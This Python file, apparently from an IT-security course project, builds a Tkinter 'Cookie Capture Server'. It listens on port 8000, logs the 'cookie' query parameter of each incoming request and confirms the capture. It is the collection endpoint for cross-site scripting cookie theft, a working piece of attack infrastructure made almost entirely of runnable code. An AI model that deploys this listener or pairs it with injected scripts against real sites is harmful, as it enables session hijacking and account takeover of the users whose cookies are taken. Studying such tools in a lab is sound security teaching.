import http.server
from urllib.parse import urlparse, parse_qs
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import webbrowser


class CaptureCookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the query parameters
        query_components = parse_qs(urlparse(self.path).query)
        if "cookie" in query_components:
            cookie_value = query_components["cookie"][0]
            self.server.gui.add_cookie(cookie_value)
        else:
            self.server.gui.add_message(
                f"No cookie found in the request. Path received: {self.path}"
            )

        # Send response
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Cookie captured successfully!")


class CaptureCookieServer(http.server.HTTPServer):
    def __init__(self, server_address, RequestHandlerClass, gui):
        super().__init__(server_address, RequestHandlerClass)
        self.gui = gui


class CookieCaptureGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Cookie Capture Server")
        self.root.geometry("800x600")

        self.label = tk.Label(root, text="Captured Cookies", font=("Arial", 14))
        self.label.pack(pady=10)

        self.text_area = scrolledtext.ScrolledText(
            root, wrap=tk.WORD, width=60, height=20, font=("Arial", 12)
        )
        self.text_area.pack(pady=10)
        self.text_area.config(state=tk.DISABLED)

        self.start_button = tk.Button(
            root, text="Start Server", command=self.start_server, font=("Arial", 12)
        )
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(
            root, text="Stop Server", command=self.stop_server, font=("Arial", 12)
        )
        self.stop_button.pack(pady=5)
        self.stop_button.config(state=tk.DISABLED)

        self.exit_button = tk.Button(
            root, text="Exit", command=self.exit_app, font=("Arial", 12)
        )
        self.exit_button.pack(pady=5)

        self.server_thread = None
        self.server = None

        # Add watermark
        self.watermark = tk.Label(
            root,
            text="Seguridad TI 2024 - Made by Seva41",
            font=("Arial", 8),
            fg="grey",
        )
        self.watermark.place(relx=1.0, rely=1.0, anchor="se", x=-10, y=-30)

        # Add GitHub link
        self.github_link = tk.Label(
            root,
            text="https://github.com/Seva41",
            font=("Arial", 8),
            fg="blue",
            cursor="hand2",
        )
        self.github_link.place(relx=1.0, rely=1.0, anchor="se", x=-10, y=-10)
        self.github_link.bind("<Button-1>", lambda e: self.open_github())

    def add_cookie(self, cookie):
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, f"Captured cookie: {cookie}\n")
        self.text_area.yview(tk.END)
        self.text_area.config(state=tk.DISABLED)

    def add_message(self, message):
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, f"{message}\n")
        self.text_area.yview(tk.END)
        self.text_area.config(state=tk.DISABLED)

    def start_server(self):
        if not self.server_thread or not self.server_thread.is_alive():
            self.server_thread = threading.Thread(target=self.run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            self.add_message("Server started.\nWaiting for cookies...")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

    def run_server(self):
        server_address = ("", 8000)
        self.server = CaptureCookieServer(server_address, CaptureCookieHandler, self)
        self.server.serve_forever()

    def stop_server(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
            self.add_message("Server stopped.")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def exit_app(self):
        if self.server and self.server_thread.is_alive():
            self.stop_server()
        self.root.quit()

    def open_github(self):
        webbrowser.open_new("https://github.com/Seva41")


if __name__ == "__main__":
    root = tk.Tk()
    gui = CookieCaptureGUI(root)
    root.mainloop()
